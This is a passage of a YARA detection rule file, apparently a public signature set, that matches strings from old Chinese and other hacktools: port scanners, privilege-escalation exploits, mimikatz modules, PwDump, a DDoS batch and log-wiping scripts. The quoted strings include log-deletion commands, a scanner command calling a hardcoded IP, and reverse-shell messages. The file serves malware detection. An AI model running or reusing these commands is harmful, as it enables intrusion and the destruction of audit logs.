score = 60
hash = "516e80e4a25660954de8c12313e2d7642bdb79dd"
strings:
$s0 = "Packed by exe32pack" ascii
$s1 = "2TInject.Dll" fullword ascii
$s2 = "Windows Services" fullword ascii
$s3 = "Findrst6" fullword ascii
$s4 = "Press Any Key To Continue......" fullword ascii
condition:
all of them
}
rule SSC_sig_238_gina {
meta:
description = "Disclosed hacktool set (old stuff) - file gina.reg"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
strings:
$s0 = "\"gina\"=\"gina.dll\"" fullword ascii
$s1 = "REGEDIT4" fullword ascii
$s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii
condition:
all of them
}
rule SSC_iKAT_cmd_as_dll {
meta:
description = "iKAT toolset file cmd.dll ReactOS file cloaked"
author = "Florian Roth"
date = "05.11.14"
score = 65
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
strings:
$s1 = "cmd.exe" fullword wide
$s2 = "ReactOS Development Team" fullword wide
$s3 = "ReactOS Command Processor" fullword wide
$ext = "extension: .dll" nocase
condition:
all of ($s*) and $ext
}
rule SSC_Hacktools_CN_Burst_pass {
meta:
description = "Disclosed hacktool set - file pass.txt"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "55a05cf93dbd274355d798534be471dff26803f9"
strings:
$s0 = "123456.com" fullword ascii
$s1 = "123123.com" fullword ascii
$s2 = "360.com" fullword ascii
$s3 = "123.com" fullword ascii
$s4 = "juso.com" fullword ascii
$s5 = "sina.com" fullword ascii
$s7 = "changeme" fullword ascii
$s8 = "master" fullword ascii
$s9 = "google.com" fullword ascii
$s10 = "chinanet" fullword ascii
$s12 = "lionking" fullword ascii
condition:
all of them
}
rule SSC_snifferport {
meta:
description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "d14133b5eaced9b7039048d0767c544419473144"
strings:
$s0 = "iphlpapi.DLL" fullword ascii
$s5 = "ystem\\CurrentCorolSet\\" fullword ascii
$s11 = "Port.TX" fullword ascii
$s12 = "32Next" fullword ascii
$s13 = "V1.2 B" fullword ascii
condition:
all of them
}
rule SSC_NtGodMode {
meta:
description = "Chinese Hacktool Set - file NtGodMode.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "8baac735e37523d28fdb6e736d03c67274f7db77"
strings:
$s0 = "to HOST!" fullword ascii
$s1 = "SS.EXE" fullword ascii
$s5 = "lstrlen0" fullword ascii
$s6 = "Virtual" fullword ascii  /* Goodware String - occured 6 times */
$s19 = "RtlUnw" fullword ascii /* Goodware String - occured 1 times */
condition:
uint16(0) == 0x5a4d and filesize < 45KB and all of them
}
rule SSC_Tzddos_DDoS_Tool_CN {
meta:
description = "Disclosed hacktool set - file tzddos"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "d4c517eda5458247edae59309453e0ae7d812f8e"
strings:
$s0 = "for /f %%a in (host.txt) do (" fullword ascii
$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
$s2 = "del host.txt /q" fullword ascii
$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
$s4 = "start Http.exe %%a %http%" fullword ascii
$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
$s6 = "del Result.txt s2.txt s1.txt " fullword ascii
condition:
all of them
}
rule SSC_sig_238_RunAsEx {
meta:
description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35"
strings:
$s0 = "RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com" fullword ascii
$s8 = "cmd.bat" fullword ascii
$s9 = "Note: This Program Can'nt Run With Local Machine." fullword ascii
$s11 = "%s Execute Succussifully." fullword ascii
$s12 = "winsta0" fullword ascii
$s15 = "Usage: RunAsEx <UserName> <Password> <Execute File> [\"Execute Option\"]" fullword ascii
condition:
4 of them
}
rule SSC_Hacktools_CN_Burst_Clear {
meta:
description = "Disclosed hacktool set - file Clear.bat"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "148c574a4e6e661aeadaf3a4c9eafa92a00b68e4"
strings:
$s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
$s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
$s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
$s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
$s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
$s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
$s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
$s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
$s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\"   " ascii
condition:
5 of them
}
rule SSC_Tiny_Network_Tool_Generic {
meta:
description = "Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)"
author = "Florian Roth"
date = "08.10.2014"
score = 40
type = "file"
hash0 = "9e1ab25a937f39ed8b031cd8cfbc4c07"
hash1 = "cafc31d39c1e4721af3ba519759884b9"
hash2 = "8e635b9a1e5aa5ef84bfa619bd2a1f92"
strings:
$magic	= { 4d 5a }
$s0 = "KERNEL32.DLL" fullword ascii
$s1 = "CRTDLL.DLL" fullword ascii
$s3 = "LoadLibraryA" fullword ascii
$s4 = "GetProcAddress" fullword ascii
$y1 = "WININET.DLL" fullword ascii
$y2 = "atoi" fullword ascii
$x1 = "ADVAPI32.DLL" fullword ascii
$x2 = "USER32.DLL" fullword ascii
$x3 = "wsock32.dll" fullword ascii
$x4 = "FreeSid" fullword ascii
$x5 = "atoi" fullword ascii
$z1 = "ADVAPI32.DLL" fullword ascii
$z2 = "USER32.DLL" fullword ascii
$z3 = "FreeSid" fullword ascii
$z4 = "ToAscii" fullword ascii
condition:
( $magic at 0 ) and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB
}
rule SSC_ReactOS_cmd_valid {
meta:
description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset"
author = "Florian Roth"
date = "05.11.14"
reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
score = 30
hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
strings:
$s1 = "ReactOS Command Processor" fullword wide
$s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
$s3 = "Eric Kohl and others" fullword wide
$s4 = "ReactOS Operating System" fullword wide
condition:
all of ($s*)
}
rule SSC_OtherTools_xiaoa {
meta:
description = "Chinese Hacktool Set - file xiaoa.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "6988acb738e78d582e3614f83993628cf92ae26d"
strings:
$s1 = "Usage:system_exp.exe \"cmd\"" fullword ascii
$s2 = "The shell \"cmd\" success!" fullword ascii
$s3 = "Not Windows NT family OS." fullword ascii /* PEStudio Blacklist: os */
$s4 = "Unable to get kernel base address." fullword ascii
$s5 = "run \"%s\" failed,code: %d" fullword ascii
$s6 = "Windows Kernel Local Privilege Exploit " fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}
rule SSC_Hacktools_CN_WinEggDrop {
meta:
description = "Disclosed hacktool set - file s.exe"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
strings:
$s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
$s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
$s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
$s8 = "Something Wrong About The Ports" fullword ascii
$s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
$s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
$s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
$s13 = "%-16s %-5d -> \"%s\"" fullword ascii
$s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
$s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
$s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii
condition:
5 of them
}
rule SSC_Pc_xai {
meta:
description = "Chinese Hacktool Set - file xai.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "f285a59fd931ce137c08bd1f0dae858cc2486491"
strings:
$s1 = "Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/" fullword wide
$s2 = "%SystemRoot%\\System32\\" fullword ascii
$s3 = "%APPDATA%\\" fullword ascii
$s4 = "---- C.Rufus Security Team ----" fullword wide
$s5 = "www.snzzkz.com" fullword wide
$s6 = "%CommonProgramFiles%\\" fullword ascii
$s7 = "GetRand.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}
rule SSC_sig_238_fscan {
meta:
description = "Disclosed hacktool set (old stuff) - file fscan.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "d5646e86b5257f9c83ea23eca3d86de336224e55"
strings:
$s0 = "FScan v1.12 - Command line port scanner." fullword ascii
$s2 = " -n    - no port scanning - only pinging (unless you use -q)" fullword ascii
$s5 = "Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200" fullword ascii
$s6 = " -z    - maximum simultaneous threads to use for scanning" fullword ascii
$s12 = "Failed to open the IP list file \"%s\"" fullword ascii
$s13 = "http://www.foundstone.com" fullword ascii
$s16 = " -p    - TCP port(s) to scan (a comma separated list of ports/ranges) " fullword ascii
$s18 = "Bind port number out of range. Using system default." fullword ascii
$s19 = "fscan.exe" fullword wide
condition:
4 of them
}
rule SSC_FreeVersion_debug {
meta:
description = "Chinese Hacktool Set - file debug.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "d11e6c6f675b3be86e37e50184dadf0081506a89"
strings:
$s0 = "c:\\Documents and Settings\\Administrator\\" fullword ascii
$s1 = "Got WMI process Pid: %d" ascii
$s2 = "This exploit will execute" ascii
$s6 = "Found token %s " ascii
$s7 = "Running reverse shell" ascii
$s10 = "wmiprvse.exe" fullword ascii
$s12 = "SELECT * FROM IIsWebInfo" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 820KB and 3 of them
}
rule SSC_CN_Hacktool_1433_Scanner_Comp2 {
meta:
description = "Detects a chinese MSSQL scanner - component 2"
author = "Florian Roth"
score = 40
date = "12.10.2014"
strings:
$magic = { 4d 5a }
$s0 = "1433" wide fullword
$s1 = "1433V" wide
$s2 = "UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU" ascii fullword
condition:
( $magic at 0 ) and all of ($s*)
}
rule SSC_IDTools_For_WinXP_IdtTool_2 {
meta:
description = "Chinese Hacktool Set - file IdtTool.sys"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "07feb31dd21d6f97614118b8a0adf231f8541a67"
strings:
$s0 = "\\Device\\devIdtTool" fullword wide
$s1 = "IoDeleteSymbolicLink" fullword ascii  /* Goodware String - occured 467 times */
$s3 = "IoDeleteDevice" fullword ascii  /* Goodware String - occured 993 times */
$s6 = "IoCreateSymbolicLink" fullword ascii /* Goodware String - occured 467 times */
$s7 = "IoCreateDevice" fullword ascii /* Goodware String - occured 988 times */
condition:
uint16(0) == 0x5a4d and filesize < 7KB and all of them
}
rule SSC_Hacktools_CN_Panda_Burst {
meta:
description = "Disclosed hacktool set - file Burst.rar"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "ce8e3d95f89fb887d284015ff2953dbdb1f16776"
strings:
$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr." ascii
condition:
all of them
}
rule SSC_Antiy_Ports_1_21 {
meta:
description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
strings:
$s0 = "AntiyPorts.EXE" fullword wide
$s7 = "AntiyPorts MFC Application" fullword wide
$s20 = " @Stego:" fullword ascii
condition:
all of them
}
rule SSC_WSockExpert {
meta:
description = "Chinese Hacktool Set - file WSockExpert.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "2962bf7b0883ceda5e14b8dad86742f95b50f7bf"
strings:
$s1 = "OpenProcessCmdExecute!" fullword ascii
$s2 = "http://www.hackp.com" fullword ascii
$s3 = "'%s' is not a valid time!'%s' is not a valid date and time" fullword wide
$s4 = "SaveSelectedFilterCmdExecute" fullword ascii
$s5 = "PasswordChar@" fullword ascii
$s6 = "WSockHook.DLL" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them
}
rule SSC_WebCrack4_RouterPasswordCracking {
meta:
description = "Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "00c68d1b1aa655dfd5bb693c13cdda9dbd34c638"
strings:
$s0 = "http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD" fullword ascii
$s1 = "Username: \"%s\", Password: \"%s\", Remarks: \"%s\"" fullword ascii
$s14 = "user:\"%s\" pass: \"%s\" result=\"%s\"" fullword ascii
$s16 = "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)" fullword ascii
$s20 = "List count out of bounds (%d)+Operation not allowed on sorted string list%String" wide
condition:
uint16(0) == 0x5a4d and filesize < 5000KB and 2 of them
}
rule SSC_PwDump
{
meta:
description = "PwDump 6 variant"
author = "Marc Stroebel"
date = "2014-04-24"
score = 70
strings:
$s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
$s6 = "Unable to query service status. Something is wrong, please manually check the st"
$s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword
condition:
all of them
}
rule SSC_iKAT_command_lines_agent {
meta:
description = "iKAT hack tools set agent - file ikat.exe"
author = "Florian Roth"
date = "05.11.14"
score = 75
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
strings:
$s0 = "Extended Module: super mario brothers" fullword ascii
$s1 = "Extended Module: " fullword ascii
$s3 = "ofpurenostalgicfeeling" fullword ascii
$s8 = "-supermariobrotheretic" fullword ascii
$s9 = "!http://132.147.96.202:80" fullword ascii
$s12 = "iKAT Exe Template" fullword ascii
$s15 = "withadancyflavour.." fullword ascii
$s16 = "FastTracker v2.00   " fullword ascii
condition:
4 of them
}
rule SSC_CN_Tools_srss_2 {
meta:
description = "Chinese Hacktool Set - file srss.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "c418b30d004051bbf1b2d3be426936b95b5fea6f"
strings:
$x1 = "used pepack!" fullword ascii
$s1 = "KERNEL32.dll" fullword ascii
$s2 = "KERNEL32.DLL" fullword ascii
$s3 = "LoadLibraryA" fullword ascii
$s4 = "GetProcAddress" fullword ascii
$s5 = "VirtualProtect" fullword ascii
$s6 = "VirtualAlloc" fullword ascii
$s7 = "VirtualFree" fullword ascii
$s8 = "ExitProcess" fullword ascii
condition:
uint16(0) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ($s*)
}
rule SSC_churrasco {
meta:
description = "Chinese Hacktool Set - file churrasco.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "a8d4c177948a8e60d63de9d0ed948c50d0151364"
strings:
$s1 = "Done, command should have ran as SYSTEM!" ascii
$s2 = "Running command with SYSTEM Token..." ascii
$s3 = "Thread impersonating, got NETWORK SERVICE Token: 0x%x" ascii
$s4 = "Found SYSTEM token 0x%x" ascii
$s5 = "Thread not impersonating, looking for another thread..." ascii
condition:
uint16(0) == 0x5a4d and filesize < 150KB and 2 of them
}
rule SSC_GoodToolset_pr {
meta:
description = "Chinese Hacktool Set - file pr.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "f6676daf3292cff59ef15ed109c2d408369e8ac8"
strings:
$s1 = "-->Got WMI process Pid: %d " ascii
$s2 = "-->This exploit gives you a Local System shell " ascii
$s3 = "wmiprvse.exe" fullword ascii
$s4 = "Try the first %d time" fullword ascii
$s5 = "-->Build&&Change By p " ascii
$s6 = "root\\MicrosoftIISv2" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 200KB and all of them
}
rule SSC_aspbackdoor_asp3 {
meta:
description = "Disclosed hacktool set (old stuff) - file asp3.txt"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
strings:
$s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
$s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
$s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
$s14 = " Windows NT " fullword ascii
$s16 = " WIndows 2000 " fullword ascii
$s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
$s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
$s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
condition:
all of them
}
rule SSC_Radmin_Hash {
meta:
description = "Chinese Hacktool Set - file Radmin_Hash.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "be407bd5bf5bcd51d38d1308e17a1731cd52f66b"
strings:
$s1 = "<description>IEBars</description>" fullword ascii
$s2 = "PECompact2" fullword ascii
$s3 = "Radmin, Remote Administrator" fullword wide
$s4 = "Radmin 3.0 Hash " fullword wide
$s5 = "HASH1.0" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 600KB and all of them
}
rule SSC__FsHttp_FsPop_FsSniffer {
meta:
description = "Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
super_rule = 1
hash0 = "9d4e7611a328eb430a8bb6dc7832440713926f5f"
hash1 = "ae23522a3529d3313dd883727c341331a1fb1ab9"
hash2 = "7ffc496cd4a1017485dfb571329523a52c9032d8"
strings:
$s0 = "-ERR Invalid Command, Type [Help] For Command List" fullword
$s1 = "-ERR Get SMS Users ID Failed" fullword
$s2 = "Control Time Out 90 Secs, Connection Closed" fullword
$s3 = "-ERR Post SMS Failed" fullword
$s4 = "Current.hlt" fullword
$s6 = "Histroy.hlt" fullword
$s7 = "-ERR Send SMS Failed" fullword
$s12 = "-ERR Change Password <New Password>" fullword
$s17 = "+OK Send SMS Succussifully" fullword
$s18 = "+OK Set New Password: [%s]" fullword
$s19 = "CHANGE PASSWORD" fullword
condition:
all of them
}
rule SSC_ByPassFireWall_zip_Folder_Inject {
meta:
description = "Disclosed hacktool set (old stuff) - file Inject.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "34f564301da528ce2b3e5907fd4b1acb7cb70728"
strings:
$s6 = "Fail To Inject" fullword ascii
$s7 = "BtGRemote Pro; V1.5 B/{" fullword ascii
$s11 = " Successfully" fullword ascii
condition:
all of them
}
rule SSC_dat_NaslLib {
meta:
description = "Chinese Hacktool Set - file NaslLib.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "fb0d4263118faaeed2d68e12fab24c59953e862d"
strings:
$s1 = "nessus_get_socket_from_connection: fd <%d> is closed" fullword ascii
$s2 = "[*] \"%s\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d" fullword ascii
$s3 = "A FsSniffer backdoor seems to be running on this port%s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1360KB and all of them
}
rule SSC_Hacktools_CN_Scan_BAT {
meta:
description = "Disclosed hacktool set - file scan.bat"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "6517d7c245f1300e42f7354b0fe5d9666e5ce52a"
strings:
$s0 = "for /f %%a in (host.txt) do (" fullword ascii
$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
$s2 = "del host.txt /q" fullword ascii
$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
$s4 = "start Http.exe %%a %http%" fullword ascii
$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
condition:
5 of them
}
rule SSC_Dos_NC {
meta:
description = "Chinese Hacktool Set - file NC.EXE"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "57f0839433234285cc9df96198a6ca58248a4707"
strings:
$s1 = "nc -l -p port [options] [hostname] [port]" fullword ascii
$s2 = "invalid connection to [%s] from %s [%s] %d" fullword ascii
$s3 = "post-rcv getsockname failed" fullword ascii
$s4 = "Failed to execute shell, error = %s" fullword ascii
$s5 = "UDP listen needs -p arg" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 290KB and all of them
}
rule SSC_portscanner {
meta:
description = "Chinese Hacktool Set - file portscanner.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "1de367d503fdaaeee30e8ad7c100dd1e320858a4"
strings:
$s0 = "PortListfNo" fullword ascii
$s1 = ".533.net" fullword ascii
$s2 = "CRTDLL.DLL" fullword ascii
$s3 = "exitfc" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 25KB and all of them
}
rule SSC_CN_Tools_Vscan {
meta:
description = "Chinese Hacktool Set - file Vscan.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "0365fe05e2de0f327dfaa8cd0d988dbb7b379612"
strings:
$s1 = "[+] Usage: VNC_bypauth <target> <scantype> <option>" fullword ascii
$s2 = "========RealVNC <= 4.1.1 Bypass Authentication Scanner=======" fullword ascii
$s3 = "[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations" fullword ascii
$s4 = "VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,..." fullword ascii
$s5 = "-vn:%-15s:%-7d  connection closed" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 60KB and 2 of them
}
rule SSC_SuperScan4 {
meta:
description = "Auto-generated rule on file SuperScan4.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "78f76428ede30e555044b83c47bc86f0"
strings:
$s2 = " td class=\"summO1\">"
$s6 = "REM'EBAqRISE"
$s7 = "CorExitProcess'msc#e"
condition:
all of them
}
rule SSC_CmdShell64 {
meta:
description = "Chinese Hacktool Set - file CmdShell64.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "5b92510475d95ae5e7cd6ec4c89852e8af34acf1"
strings:
$s1 = "C:\\Windows\\System32\\JAVASYS.EXE" fullword wide
$s2 = "ServiceCmdShell" fullword ascii
$s3 = "<!-- If your application is designed to work with Windows 8.1, uncomment the fol" ascii
$s4 = "ServiceSystemShell" fullword wide
$s5 = "[Root@CmdShell ~]#" fullword wide
$s6 = "Hello Man 2015 !" fullword wide
$s7 = "CmdShell" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 30KB and 4 of them
}
rule SSC_Pc_rejoice {
meta:
description = "Chinese Hacktool Set - file rejoice.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "fe634a9f5d48d5c64c8f8bfd59ac7d8965d8f372"
strings:
$s1 = "@members.3322.net/dyndns/update?system=dyndns&hostname=" fullword ascii
$s2 = "http://www.xxx.com/xxx.exe" fullword ascii
$s3 = "@ddns.oray.com/ph/update?hostname=" fullword ascii
$s4 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
$s5 = "ListViewProcessListColumnClick!" fullword ascii
$s6 = "http://iframe.ip138.com/ic.asp" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 3000KB and 3 of them
}
rule SSC_MSSqlPass {
meta:
description = "Chinese Hacktool Set - file MSSqlPass.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "172b4e31ed15d1275ac07f3acbf499daf9a055d7"
strings:
$s0 = "Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server" wide
$s1 = "empv.exe" fullword wide
$s2 = "Enterprise Manager PassView" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 120KB and all of them
}
rule SSC_SqlDbx_zhs {
meta:
description = "Chinese Hacktool Set - file SqlDbx_zhs.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "e34228345498a48d7f529dbdffcd919da2dea414"
strings:
$s0 = "S.failed_logins \"Failed Login Attempts\", " fullword ascii
$s7 = "SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE" fullword ascii
$s8 = "SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'" ascii
$s9 = "bcp.exe <:schema:>.<:table:> out \"<:file:>\" -n -S <:server:> -U <:user:> -P <:" ascii
$s11 = "L.login_policy_name AS \"Login Policy\", " fullword ascii
$s12 = "mailto:support@sqldbx.com" fullword ascii
$s15 = "S.last_login_time \"Last Login\", " fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_CN_Hacktool_1433_Scanner {
meta:
description = "Detects a chinese MSSQL scanner"
author = "Florian Roth"
score = 40
date = "12.10.2014"
strings:
$magic = { 4d 5a }
$s0 = "1433" wide fullword
$s1 = "1433V" wide
$s2 = "del Weak1.txt" ascii fullword
$s3 = "del Attack.txt" ascii fullword
$s4 = "del /s /Q C:\\Windows\\system32\\doors\\" fullword ascii
$s5 = "!&start iexplore http://www.crsky.com/soft/4818.html)" fullword ascii
condition:
( $magic at 0 ) and all of ($s*)
}
rule SSC_OtherTools_servu {
meta:
description = "Chinese Hacktool Set - file svu.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "5c64e6879a9746a0d65226706e0edc7a"
strings:
$s0 = "MZKERNEL32.DLL" fullword ascii
$s1 = "UpackByDwing@" fullword ascii
$s2 = "GetProcAddress" fullword ascii
$s3 = "WriteFile" fullword ascii
condition:
$s0 at 0 and filesize < 50KB and all of them
}
rule SSC_Sword1_5 {
meta:
description = "Chinese Hacktool Set - file Sword1.5.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "96ee5c98e982aa8ed92cb4cedb85c7fda873740f"
strings:
$s3 = "http://www.ip138.com/ip2city.asp" fullword wide
$s4 = "http://www.md5decrypter.co.uk/feed/api.aspx?" fullword wide
$s6 = "ListBox_Command" fullword wide
$s13 = "md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack" fullword wide
$s18 = "\\Set.ini" fullword wide
$s19 = "OpenFileDialog1" fullword wide
$s20 = " (*.txt)|*.txt" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 400KB and 4 of them
}
rule SSC_IISPutScannesr {
meta:
description = "Chinese Hacktool Set - file IISPutScannesr.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "2dd8fee20df47fd4eed5a354817ce837752f6ae9"
strings:
$s1 = "yoda & M.o.D." ascii
$s2 = "-> come.to/f2f **************" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 500KB and all of them
}
rule SSC_Win32_klock {
meta:
description = "Chinese Hacktool Set - file klock.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "7addce4434670927c4efaa560524680ba2871d17"
strings:
$s1 = "klock.dll" fullword ascii
$s2 = "Erreur : impossible de basculer le bureau ; SwitchDesktop : " fullword wide
$s3 = "klock de mimikatz pour Windows" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 250KB and all of them
}
rule SSC_kappfree_2 {
meta:
description = "Chinese Hacktool Set - file kappfree.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "5d578df9a71670aa832d1cd63379e6162564fb6b"
strings:
$s1 = "kappfree.dll" fullword ascii
$s2 = "kappfree de mimikatz pour Windows (anti AppLocker)" fullword wide
$s3 = "' introuvable !" fullword wide
$s4 = "kiwi\\mimikatz" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}
rule SSC_CleanIISLog {
meta:
description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
strings:
$s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
$s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
$s8 = "CleanIISLog Ver" fullword ascii
$s9 = "msftpsvc" fullword ascii
$s10 = "Fatal Error: MFC initialization failed" fullword ascii
